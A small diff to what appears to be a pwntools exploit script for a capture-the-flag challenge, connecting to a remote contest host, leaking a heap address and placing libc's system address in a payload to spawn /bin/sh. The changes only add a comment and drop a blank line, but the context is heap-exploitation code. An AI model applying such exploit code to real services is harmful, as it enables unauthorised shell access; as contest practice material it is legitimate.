@@ -23,6 +23,7 @@ r = remote('problem.harekaze.com', 20175)
 comment_addr = 0x204000
 r.sendline('/bin/sh')
 
+# leak
 add(0x80, '')
 addr = add(0x80, '')['addr']
 add(0x80, '')
@@ -61,7 +62,6 @@ add(0x60, p64(0))
 payload  = '\x00' * 3
 payload += p64(0) * 2
 payload += p64(libc.symbols['system'])
-
 add(0x60, payload)
 
 # trigger
